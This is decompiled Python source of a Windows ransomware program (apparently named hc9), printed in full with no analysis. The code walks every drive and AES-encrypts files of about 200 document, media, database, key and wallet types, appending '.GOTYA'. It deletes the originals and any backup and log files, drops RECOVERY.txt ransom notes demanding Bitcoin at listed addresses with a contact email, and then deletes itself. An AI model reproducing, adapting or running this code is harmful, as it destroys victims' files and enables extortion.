# uncompyle6 version 3.9.0
# Python bytecode version base 2.7 (62211)
# Decompiled from: Python 3.7.8 (tags/v3.7.8:4b47a5b6ba, Jun 28 2020, 08:53:46) [MSC v.1916 64 bit (AMD64)]
# Embedded file name: hc9.py
# Compiled at: 2017-02-14 11:38:06
import win32api
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys, subprocess, base64
suffix = '.GOTYA'
valid_extension = [
 '.txt', '.exe', '.php', '.pl', '.log', 
 '.7z', '.rar', '.m4a', '.wma', 
 '.avi', 
 '.wmv', '.csv', '.d3dbsp', 
 '.sc2save', '.sie', '.sum', '.ibank', 
 '.t13', 
 '.t12', '.qdf', '.gdb', 
 '.tax', '.pkpass', '.bc6', '.bc7', 
 '.bkp', 
 '.qic', '.bkf', '.sidn', 
 '.sidd', '.mddata', '.itl', '.itdb', 
 '.icxs', 
 '.hvpl', '.hplg', '.hkdb', 
 '.mdbackup', '.syncdb', '.gho', '.cas', 
 '.svg', 
 '.map', '.wmo', '.itm', 
 '.sb', '.fos', '.mcgame', '.vdf', 
 '.ztmp', 
 '.sis', '.sid', '.ncf', 
 '.menu', '.layout', '.dmp', '.blob', 
 '.esm', 
 '.001', '.vtf', '.dazip', 
 '.fpk', '.mlx', '.kf', '.iwd', 
 '.vpk', 
 '.tor', '.psk', '.rim', 
 '.w3x', '.fsh', '.ntl', '.arch00', 
 '.lvl', 
 '.snx', '.cfr', '.ff', 
 '.vpp_pc', '.lrf', '.m2', '.mcmeta', 
 '.vfs0', 
 '.mpqge', '.kdb', '.db0', 
 '.mp3', '.upx', '.rofl', '.hkx', 
 '.bar', 
 '.upk', '.das', '.iwi', 
 '.litemod', '.asset', '.forge', '.ltx', 
 '.bsa', 
 '.apk', '.re4', '.sav', 
 '.lbf', '.slm', '.bik', '.epk', 
 '.rgss3a', 
 '.pak', '.big', '.unity3d', 
 '.wotreplay', '.xxx', '.desc', '.py', 
 '.m3u', 
 '.flv', '.js', '.css', 
 '.rb', '.png', '.jpeg', '.p7c', 
 '.p7b', '.p12', 
 '.pfx', '.pem', 
 '.crt', '.cer', '.der', '.x3f', 
 '.srw', '.pef', 
 '.ptx', '.r3d', 
 '.rw2', '.rwl', '.raw', '.raf', 
 '.orf', '.nrw', 
 '.mrwref', '.mef', 
 '.erf', '.kdc', '.dcr', '.cr2', 
 '.crw', '.bay', 
 '.sr2', '.srf', 
 '.arw', '.3fr', '.dng', '.jpeg', 
 '.jpg', '.cdr', 
 '.indd', '.ai', 
 '.eps', '.pdf', '.pdd', '.psd', 
 '.dbfv', '.mdf', 
 '.wb2', '.rtf', 
 '.wpd', '.dxg', '.xf', '.dwg', 
 '.pst', '.accdb', 
 '.mdb', '.pptm', 
 '.pptx', '.ppt', '.xlk', '.xlsb', 
 '.xlsm', '.xlsx', 
 '.xls', '.wps', 
 '.docm', '.docx', '.doc', '.odb', 
 '.odc', '.odm', 
 '.odp', '.ods', 
 '.odt', '.sql', '.zip', '.tar', 
 '.tar.gz', '.tgz', 
 '.biz', '.ocx', 
 '.html', '.htm', '.3gp', '.srt', 
 '.cpp', '.mid', 
 '.mkv', '.mov', 
 '.asf', '.mpeg', '.vob', '.mpg', 
 '.fla', '.swf', 
 '.wav', '.qcow2', 
 '.vdi', '.vmdk', '.vmx', '.gpg', 
 '.aes', '.ARC', 
 '.PAQ', '.tar.bz2', 
 '.tbk', '.djv', '.djvu', 
 '.bmp', '.cgm', '.tif', 
 '.tiff', 
 '.NEF', '.cmd', '.class', '.jar', 
 '.java', '.asp', '.brd', 
 '.sch', 
 '.dch', '.dip', '.vbs', '.asm', 
 '.pas', '.ldf', '.ibd', 
 '.MYI', 
 '.MYD', '.frm', '.dbf', '.SQLITEDB', 
 '.SQLITE3', '.asc', 
 '.lay6', '.lay', 
 '.ms11 (Security copy)', '.sldm', '.sldx', '.ppsm', 
 '.ppsx', 
 '.ppam', '.docb', '.mml', 
 '.sxm', '.otg', '.slk', '.xlw', 
 '.xlt', 
 '.xlm', '.xlc', '.dif', 
 '.stc', '.sxc', '.ots', '.ods', 
 '.hwp', 
 '.dotm', '.dotx', '.docm', 
 '.DOT', '.max', '.xml', '.uot', 
 '.stw', 
 '.sxw', '.ott', '.csr', 
 '.key', 'wallet.dat']

def encrypt(key, file_name):
    chunk_s = 65536
    output_file = os.path.join(os.path.dirname(file_name), os.path.basename(file_name) + suffix)
    fsize = str(os.path.getsize(file_name)).zfill(16)
    ini_vect = ''
    for i in range(16):
        ini_vect += chr(random.randint(0, 255))

    encryptor = AES.new(key, AES.MODE_CBC, ini_vect)
    with open(file_name, 'rb') as (infile):
        with open(output_file, 'wb') as (outfile):
            outfile.write(fsize)
            outfile.write(ini_vect)
            while True:
                chunk = infile.read(chunk_s)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)
                outfile.write(encryptor.encrypt(chunk))


def getDigest(password):
    hasher = SHA256.new(password)
    return hasher.digest()


readmename = 'RECOVERY.txt'

def files2crypt(path):
    allFiles = []
    for root, subfiles, files in os.walk(path):
        if 'System32' in root:
            pass
        for names in files:
            allFiles.append(os.path.join(root, names))

    return allFiles


def run_crypt():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\x00')[:-1]
    if len(sys.argv) < 2:
        print 'File Corrupted'
        sys.exit(0)
    computer_id = base64.b64encode(str(os.environ['COMPUTERNAME']) + '-08')
    junktext = '9080(*{){){){){){){){){){){){){){){\n    O489BU84BU84BU94BU94BU94UB94BU9B4U9B\n    2U0B202..0H2.H20.H2.0H2.0H2.0H2.0H\n    SOH8484BU9O48BU984BUO948UBO498BO49U8BO49U8B\n    o(EH*e(d#*(*!@$&(*@&#$(*#&$(*273998374987#(*$&(#$*987987$(*&#$(*#&$(&\n    98798&#$(*&(9879*#$&(*&(*&9*&(*&('
    password = sys.argv[1]
    if len(sys.argv) == 3:
        print 'Testing ' + sys.argv[2]
        encrypt(getDigest(password), str(sys.argv[2]))
        sys.exit(0)
    addresses = [
     '1JFjQ8JA6d5QYVXYijUkpx2eBFTgyz77ch', '1FhvGZeUDGr4a6EshsgBr1wXpgom547wCK', 
     '1FcVZiLC6w5eARhmRhtAifyrRgudG9kfJ', 
     '1PE9ryU3Zp5k42TbQPBi6YA9tURrsPr7J9', 
     '1GgzdjARzVYvaUNNL66LQfNPqCVbfFYmKM', 
     '1M4RY6Q3vXhjtvGwRBkD2bqV9HdnJ5QSBS', 
     '1NYeBBMrHgPpbLC7ExXqCx7wzfpeUcADs6', 
     '1NYaVPJGEFzwCzYsvp5swNTDiU2so1BvKx', 
     '14QQ9RAcAMyFQWnPTWt2JedsHYG6GUupAk', 
     '1G7sCE1rSKZh4kif6a8hLU1fSn3sxg8Yp5', 
     '1B8G2L24xbn1sDbPurUNGMXwZWFgVXuYQv', 
     '15aM71TGtRZRrY97vdGcDEZeJYBWZhf4FP', 
     '15PbYxKuH8KNdxzUeuXqr5VctuKQxdEPeE']
    readme_str = '\nALL YOUR FILES WERE ENCRYPTED. \nTO RESTORE, YOU MUST SEND $500 BTC FOR ONE COMPUTER\nOR $5,000 BTC FOR ALL NETWORK\n'
    readme_str += 'ADDRESS: ' + random.choice(addresses)
    readme_str += '\nAFTER PAYMENT SENT EMAIL m4zn0v@keemail.me\n'
    readme_str += 'ALONG WITH YOUR IDENTITY: ' + computer_id
    readme_str += '\nNOT TO TURN OFF YOUR COMPUTER, UNLESS IT WILL BREAK\n'
    readme_str += '\n'
    for drive in drives:
        for file_pnt in files2crypt(drive):
            if os.path.basename(file_pnt).endswith(suffix) or os.path.basename(sys.executable) in file_pnt or os.path.basename(file_pnt).endswith('PsExec.exe'):
                pass
            else:
                extension = str(os.path.splitext(file_pnt)[1])
                if extension.lower() in valid_extension:
                    try:
                        encrypt(getDigest(password), str(file_pnt))
                        os.remove(file_pnt)
                    except:
                        pass

                elif '.bak' in extension or '.log' in extension:
                    try:
                        os.remove(file_pnt)
                    except:
                        pass

        for root, subfiles, files in os.walk(drive):
            if 'System32' in root:
                pass
            try:
                readme = open(os.path.join(root, readmename), 'w')
                readme.write(readme_str)
                readme.close()
            except:
                pass

    if 'python' not in sys.executable.lower():
        try:
            os.remove(sys.argv[0])
        except:
            pass

    sys.exit(0)


run_crypt()
# okay decompiling hc9.pyc
